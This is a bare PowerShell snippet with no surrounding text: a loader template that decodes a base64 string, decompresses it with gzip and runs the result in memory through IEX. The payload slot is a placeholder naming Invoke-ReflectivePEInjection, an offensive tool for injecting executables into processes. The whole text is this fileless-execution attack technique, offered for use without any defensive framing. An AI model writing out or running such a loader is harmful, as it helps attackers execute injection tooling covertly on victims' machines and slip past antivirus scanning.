$s=New-Object
IO.MemoryStream(,[Convert]::FromBase64String('insert_gzip_compressed_InvokeReflectivePEInjection'));
IEX (New-Object IO.StreamReader(New-Object
IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).
ReadToEnd()